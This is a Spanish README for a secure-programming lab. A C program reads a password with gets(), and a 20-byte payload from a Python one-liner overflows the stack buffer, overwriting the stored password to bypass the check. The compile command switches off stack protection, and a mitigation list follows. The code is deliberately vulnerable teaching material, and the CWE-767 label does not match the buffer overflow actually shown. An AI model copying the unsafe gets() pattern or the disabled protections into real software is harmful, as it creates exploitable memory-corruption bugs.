# CWE-767: Access to Critical Private Variable via Public Method

Práctica de **Programación Segura** que ejemplifica la vulnerabilidad [CWE-767](https://cwe.mitre.org/data/definitions/767.html) en una aplicación de consola en C sobre Linux. Mediante un *payload* se manipula la memoria de la pila para sobrescribir una variable privada crítica y obtener acceso sin conocer la contraseña real.

## Descripción

El programa en C solicita una contraseña y la compara con un valor almacenado en la variable `correctPassword`. Como la lectura se hace con `gets()` (sin control de longitud) y el buffer `password[10]` queda contiguo a `correctPassword` en la pila, una entrada de 20 bytes desborda el buffer y sobrescribe también `correctPassword`. Al quedar ambas variables con el mismo contenido, `strncmp` las considera iguales y se imprime el mensaje de acceso concedido.

## Estructura

```
cwe-767/
├── programa.c    # Aplicación vulnerable en C
├── programa.out  # Binario compilado
└── payload.py    # Generador del payload
```

## Código

`programa.c`

```c
#include <stdio.h>
#include <string.h>

int main() {
    char correctPassword[] = "patito";
    char password[10];

    gets(password);

    if (strncmp(password, correctPassword, 10) == 0) {
        printf("\nPassword correcto. Bienvenido!\n");
    } else {
        printf("\nAcceso denegado.\n");
    }
}
```

`payload.py`

```python
output = "A" * 20
print(output)
```

## Compilación

Se desactivan las protecciones del compilador para reproducir la vulnerabilidad:

```bash
gcc programa.c -o programa.out -fno-stack-protector -z execstack
```

## Ejecución

Entrada normal (acceso denegado):

```bash
./programa.out
```

Explotación con el payload (20 bytes: 10 para `password[10]` + 10 para `correctPassword`):

```bash
python payload.py | ./programa.out
```

Salida obtenida:

```
Password correcto. Bienvenido!
```

## Mitigación

- Sustituir `gets()` por `fgets()` con un límite de longitud.
- Mantener activadas las protecciones del compilador (*stack canaries*, `-fstack-protector`).
- Validar el tamaño de la entrada antes de copiarla a un buffer de tamaño fijo.

## Autor

Angel Gabriel Aguilar Hernandez — [github.com/Arclyne](https://github.com/Arclyne)